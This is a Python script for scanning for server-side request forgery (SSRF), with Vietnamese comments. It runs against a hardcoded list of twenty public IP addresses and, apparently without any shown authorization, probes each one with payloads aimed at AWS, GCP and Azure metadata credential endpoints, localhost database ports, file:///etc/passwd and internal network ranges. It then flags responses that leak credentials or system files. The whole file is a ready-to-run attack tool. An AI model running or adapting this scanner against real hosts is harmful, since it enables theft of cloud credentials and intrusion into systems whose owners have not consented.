"""
SSRF Testing Script
"""

import requests
import concurrent.futures
from typing import Dict, List, Tuple
import urllib3

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGETS = [
    "http://34.229.181.59:3000",
    "http://3.238.80.112:3000",
    "https://13.39.91.160:443",
    "http://3.106.236.163:80",
    "http://52.32.31.237:80",
    "https://3.111.129.147:443",
    "https://3.109.80.136:443",
    "https://13.232.242.161:443",
    "https://3.133.255.169:443",
    "https://18.167.123.22:443",
    "http://52.23.185.196:3000",
    "http://35.168.176.163:80",
    "https://34.225.21.76:443",
    "http://18.190.95.156:80",
    "http://44.193.89.100:80",
    "https://34.237.14.77:443",
    "https://52.8.123.149:443",
    "https://3.33.176.163:443",
    "http://54.198.76.254:3000",
    "http://18.226.150.214:3000",
]

# Common SSRF payloads
SSRF_PAYLOADS = [
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",

    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",

    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",

    # Internal services
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",

    # Common internal ports
    "http://127.0.0.1:22/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:6379/",  # Redis
    "http://127.0.0.1:27017/", # MongoDB
    "http://127.0.0.1:5432/",  # PostgreSQL
    "http://127.0.0.1:3306/",  # MySQL

    # File protocol
    "file:///etc/passwd",
    "file:///etc/hosts",

    # Internal network ranges
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://192.168.0.1/",
    "http://192.168.1.1/",
]

# Common SSRF vulnerable parameters
SSRF_PARAMS = ["url", "uri", "path", "dest", "redirect", "target", "rurl", "link",
               "src", "source", "href", "file", "load", "page", "fetch", "callback",
               "next", "return", "continue", "goto", "out", "view", "dir", "domain",
               "site", "feed", "host", "to", "from", "ref", "data", "img", "image"]


def test_endpoint(url: str, timeout: int = 5) -> Dict:
    """Test một endpoint"""
    result = {
        "url": url,
        "status": None,
        "headers": {},
        "body_preview": "",
        "error": None,
        "potential_ssrf_endpoints": []
    }

    try:
        # Basic GET request
        resp = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
        result["status"] = resp.status_code
        result["headers"] = dict(resp.headers)
        result["body_preview"] = resp.text[:500] if resp.text else ""

        # Check for potential SSRF parameters in response
        body_lower = resp.text.lower() if resp.text else ""
        for param in SSRF_PARAMS:
            if param in body_lower or f"?{param}=" in body_lower:
                result["potential_ssrf_endpoints"].append(param)

    except requests.exceptions.Timeout:
        result["error"] = "Timeout"
    except requests.exceptions.ConnectionError as e:
        result["error"] = f"Connection Error: {str(e)[:100]}"
    except Exception as e:
        result["error"] = f"Error: {str(e)[:100]}"

    return result


def test_ssrf_payload(base_url: str, payload: str, param: str = "url", timeout: int = 5) -> Dict:
    """Test SSRF payload"""
    result = {
        "base_url": base_url,
        "payload": payload,
        "param": param,
        "status": None,
        "vulnerable": False,
        "response_preview": "",
        "error": None
    }

    try:
        # Test với parameter
        test_url = f"{base_url}?{param}={payload}"
        resp = requests.get(test_url, timeout=timeout, verify=False, allow_redirects=False)
        result["status"] = resp.status_code
        result["response_preview"] = resp.text[:300] if resp.text else ""

        # Check for signs of successful SSRF
        indicators = [
            "root:", "passwd", "shadow",  # /etc/passwd
            "ami-id", "instance-id", "security-credentials",  # AWS metadata
            "computeMetadata", "google",  # GCP metadata
            "microsoft", "azure",  # Azure metadata
            "localhost", "127.0.0.1",  # Internal access
        ]

        for indicator in indicators:
            if indicator.lower() in resp.text.lower():
                result["vulnerable"] = True
                break

    except requests.exceptions.Timeout:
        result["error"] = "Timeout"
    except requests.exceptions.ConnectionError:
        result["error"] = "Connection refused"
    except Exception as e:
        result["error"] = str(e)[:100]

    return result


def scan_all_targets():
    """Scan tất cả targets"""
    print("=" * 80)
    print("SSRF TESTING - SCANNING TARGETS")
    print("=" * 80)

    results = []

    # First pass: Check which endpoints are alive
    print("\n[*] Phase 1: Checking alive endpoints...")
    alive_targets = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_url = {executor.submit(test_endpoint, url): url for url in TARGETS}

        for future in concurrent.futures.as_completed(future_to_url):
            url = future_to_url[future]
            result = future.result()
            results.append(result)

            if result["status"]:
                alive_targets.append(url)
                print(f"  [+] {url} - Status: {result['status']}")
                if result["potential_ssrf_endpoints"]:
                    print(f"      Potential SSRF params: {result['potential_ssrf_endpoints']}")
            else:
                print(f"  [-] {url} - {result['error']}")

    print(f"\n[*] Alive targets: {len(alive_targets)}/{len(TARGETS)}")

    # Second pass: Test SSRF on alive targets
    if alive_targets:
        print("\n[*] Phase 2: Testing SSRF payloads on alive targets...")
        ssrf_results = []

        for target in alive_targets:
            print(f"\n  Testing: {target}")

            # Test common SSRF payloads
            for payload in SSRF_PAYLOADS[:10]:  # Test first 10 payloads
                for param in SSRF_PARAMS[:5]:  # Test first 5 params
                    result = test_ssrf_payload(target, payload, param, timeout=3)

                    if result["vulnerable"]:
                        print(f"    [!!!] VULNERABLE: {param}={payload}")
                        print(f"         Response: {result['response_preview'][:100]}")
                        ssrf_results.append(result)
                    elif result["status"] and result["status"] != 404:
                        # Interesting response
                        if result["status"] in [200, 301, 302, 500]:
                            print(f"    [?] Interesting: {param}={payload[:30]}... -> {result['status']}")

    return results


def detailed_scan(target: str):
    """Scan chi tiết một target"""
    print(f"\n{'='*80}")
    print(f"DETAILED SSRF SCAN: {target}")
    print(f"{'='*80}")

    # Test endpoint
    result = test_endpoint(target)
    print(f"\n[*] Basic Info:")
    print(f"    Status: {result['status']}")
    print(f"    Server: {result['headers'].get('Server', 'N/A')}")
    print(f"    Content-Type: {result['headers'].get('Content-Type', 'N/A')}")

    if result['body_preview']:
        print(f"\n[*] Response Preview:")
        print(f"    {result['body_preview'][:200]}...")

    # Test common endpoints
    common_paths = [
        "/", "/api", "/api/v1", "/v1", "/v2",
        "/admin", "/debug", "/health", "/status",
        "/proxy", "/fetch", "/url", "/redirect",
        "/load", "/read", "/file", "/page",
        "/webhook", "/callback", "/ssrf", "/request"
    ]

    print(f"\n[*] Testing common paths...")
    for path in common_paths:
        try:
            test_url = f"{target.rstrip('/')}{path}"
            resp = requests.get(test_url, timeout=3, verify=False)
            if resp.status_code != 404:
                print(f"    [+] {path} -> {resp.status_code} ({len(resp.content)} bytes)")
        except:
            pass

    # Test SSRF with all payloads
    print(f"\n[*] Testing SSRF payloads...")
    vulnerabilities = []

    for param in SSRF_PARAMS:
        for payload in SSRF_PAYLOADS:
            result = test_ssrf_payload(target, payload, param, timeout=3)

            if result["vulnerable"]:
                vulnerabilities.append(result)
                print(f"    [!!!] VULNERABLE: ?{param}={payload}")
            elif result["status"] == 200:
                # Check response length difference
                try:
                    base_resp = requests.get(f"{target}?{param}=http://example.com", timeout=3, verify=False)
                    if len(result.get("response_preview", "")) != len(base_resp.text[:300]):
                        print(f"    [?] Response diff: ?{param}={payload[:40]}...")
                except:
                    pass

    if vulnerabilities:
        print(f"\n[!!!] FOUND {len(vulnerabilities)} VULNERABILITIES!")
        for v in vulnerabilities:
            print(f"    - {v['param']}={v['payload']}")
    else:
        print(f"\n[*] No obvious SSRF vulnerabilities found")


if __name__ == "__main__":
    # Run scan
    scan_all_targets()
